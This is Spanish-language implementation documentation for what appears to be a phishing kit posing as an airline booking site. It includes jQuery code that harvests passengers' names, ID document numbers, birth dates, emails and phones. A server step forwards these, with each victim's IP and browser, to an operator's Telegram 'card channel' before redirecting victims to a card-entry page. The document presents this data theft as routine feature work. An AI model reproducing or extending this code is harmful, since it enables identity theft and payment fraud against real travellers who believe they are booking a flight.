# Envío de Información de Pasajeros a Telegram

## Descripción
Se ha implementado un sistema automático para capturar y enviar la información de los pasajeros a Telegram cuando completan el formulario de datos.

## Cambios Realizados

### 1. Captura de Datos de Pasajeros (`__ltam/pasajeros.php:1491-1519`)

Se modificó el evento del botón "Confirmar datos" para capturar toda la información de los pasajeros antes de enviarla al servidor:

#### Datos Capturados por Pasajero:
- **Nombre** (firstName)
- **Apellido** (lastName)
- **Tipo de Documento** (Cédula de Identidad o Pasaporte)
- **Número de Documento** (documentNumber)
- **Género** (Masculino/Femenino)
- **Fecha de Nacimiento** (dateOfBirth)
- **Email**
- **Teléfono**

#### Ejemplo de Captura:
```javascript
let pasajeros = [];
$(".passengerstyle__Ol-ejn4dv-0.egpEjI li form").each(function() {
    const $form = $(this);

    pasajeros.push({
        nombre: $form.find("input[name='passengerDetails.firstName']").val().trim(),
        apellido: $form.find("input[name='passengerDetails.lastName']").val().trim(),
        tipoDocumento: $form.find("#mui-component-select-documentInfo\\.documentType").text().trim(),
        numDocumento: $form.find("input[name='documentInfo.documentNumber']").val().trim(),
        genero: $form.find("#mui-component-select-passengerInfo\\.gender").text().trim(),
        fechaNacimiento: $form.find("input[id^='passengerInfo-dateOfBirth-']").val().trim(),
        email: $form.find("input[name='passengerInfo.emails']").val().trim(),
        telefono: $form.find("input[name='passengerInfo.phones[0].number']").val().trim()
    });
});
```

### 2. Procesamiento en el Servidor (`processing.php:703-759`)

Se agregó un nuevo caso `'datos-pasajeros'` que:
1. Recibe los datos JSON de los pasajeros
2. Los decodifica y procesa
3. Crea un registro en la base de datos
4. Formatea un mensaje para Telegram
5. Envía el mensaje al canal de Telegram configurado

#### Formato del Mensaje en Telegram:
```
✈️✈️✈️ PASAJEROS ✈️✈️✈️
━━━━━━━━━━━━━━━━━━━━

👤 PASAJERO #1
👤 Nombre: Juan Pérez
📋 Tipo Doc: Cédula de Identidad
🆔 Documento: 1234567890
⚧ Género: Masculino
🎂 F. Nacimiento: 1990-05-15
📧 Email: juan@email.com
📞 Teléfono: 3001234567
━━━━━━━━━━━━━━━━━━━━

👤 PASAJERO #2
👤 Nombre: María García
📋 Tipo Doc: Pasaporte
🆔 Documento: AB123456
⚧ Género: Femenino
🎂 F. Nacimiento: 1985-08-22
📧 Email: maria@email.com
📞 Teléfono: 3009876543
━━━━━━━━━━━━━━━━━━━━

🔧 INFORMACIÓN ADICIONAL
📱 IP: 192.168.1.100
💻 Dispositivo: Mozilla/5.0...
```

### 3. Base de Datos

El nuevo estado `'rec_datos_pasajeros'` se almacena en la tabla `datos` con los siguientes campos:
- `email` - Email del primer pasajero
- `nombres` - Nombre completo del primer pasajero
- `celular` - Teléfono del primer pasajero
- `status` - 'rec_datos_pasajeros'
- `ip` - Dirección IP del usuario
- `dispositivo` - User Agent del navegador
- `horacreado` - Timestamp de creación

**Nota**: Los datos completos de todos los pasajeros se envían a Telegram pero no se almacenan individualmente en la BD actualmente.

## Flujo de Trabajo

1. **Usuario completa el formulario** de pasajeros en `pasajeros.php`
2. **Hace clic en "Confirmar datos"**
3. **Se validan** todos los campos requeridos
4. **Se capturan** los datos de todos los pasajeros
5. **Se envían** al servidor mediante AJAX a `processing.php` con `t: 'datos-pasajeros'`
6. **El servidor procesa** los datos y crea un registro en la BD
7. **Se formatea** el mensaje con la información de todos los pasajeros
8. **Se envía** a Telegram usando `enviar_telegram()`
9. **El usuario** es redirigido a la página de tarjetas (`card.php`)

## Canal de Telegram

Actualmente, la información se envía al **canal de tarjetas** (card channel):
```php
enviar_telegram($contenido, $owner, false, []);
```

Si deseas enviarlo al canal de banco, cambia el segundo parámetro a `true`:
```php
enviar_telegram($contenido, $owner, true, []);
```

## Características Adicionales

### Soporte para Múltiples Pasajeros
El sistema soporta cualquier cantidad de pasajeros. Cada uno se muestra numerado en el mensaje de Telegram.

### Validación Previa
Antes de enviar los datos, se ejecuta `validarTodosLosPasajeros()` que verifica que todos los campos obligatorios estén completos.

### Información del Dispositivo
Se incluye información adicional como:
- Dirección IP
- User Agent (navegador y sistema operativo)

## Personalización

### Cambiar el Formato del Mensaje
Edita las líneas 734-752 en `processing.php` para modificar el formato del mensaje.

### Agregar Más Campos
1. Captura el nuevo campo en `pasajeros.php` (líneas 1496-1505)
2. Agrégalo al mensaje en `processing.php` (líneas 739-746)

### Almacenar Datos de Todos los Pasajeros en BD
Si necesitas almacenar cada pasajero individualmente:
1. Crea una nueva tabla `pasajeros` con los campos necesarios
2. Modifica el caso 'datos-pasajeros' para insertar un registro por cada pasajero

## Ejemplo de Tabla SQL para Pasajeros

Si deseas crear una tabla específica para pasajeros:

```sql
CREATE TABLE `pasajeros` (
  `id` INT NOT NULL AUTO_INCREMENT,
  `registro_id` INT NOT NULL,
  `nombre` VARCHAR(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `apellido` VARCHAR(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `tipo_documento` VARCHAR(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `num_documento` VARCHAR(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `genero` VARCHAR(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `fecha_nacimiento` VARCHAR(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `email` VARCHAR(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `telefono` VARCHAR(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `horacreado` VARCHAR(12) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `registro_id` (`registro_id`),
  FOREIGN KEY (`registro_id`) REFERENCES `datos`(`idreg`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
```

## Pruebas

Para probar el sistema:

1. Accede a la página de pasajeros
2. Completa el formulario con datos de prueba
3. Haz clic en "Confirmar datos"
4. Verifica que:
   - El mensaje llegue a Telegram con la información correcta
   - Se cree un registro en la tabla `datos`
   - El usuario sea redirigido a la página de tarjetas

## Resolución de Problemas

### El mensaje no llega a Telegram
1. Verifica que el token de Telegram esté configurado correctamente
2. Revisa el archivo `error.log` para ver errores
3. Asegúrate de que la función `enviar_telegram()` esté funcionando

### Los datos no se capturan correctamente
1. Abre la consola del navegador (F12)
2. Verifica que el array `pasajeros` contenga los datos esperados
3. Revisa que los selectores jQuery sean correctos

### Error en el servidor
1. Revisa el archivo `error_log` de PHP
2. Verifica que el JSON se esté decodificando correctamente
3. Asegúrate de que todos los campos existan en los datos POST

## Notas de Seguridad

- Los datos se envían mediante POST
- Se validan en el servidor antes de procesarlos
- Se utiliza `mysqli_real_escape_string()` al insertar en la BD (mediante `crear_registro()`)
- Se recomienda agregar más validaciones según sea necesario

---
**Fecha de implementación**: 2025-11-14
**Versión**: 1.0
**Archivos modificados**:
- `__ltam/pasajeros.php` (líneas 1491-1519)
- `processing.php` (líneas 703-759)
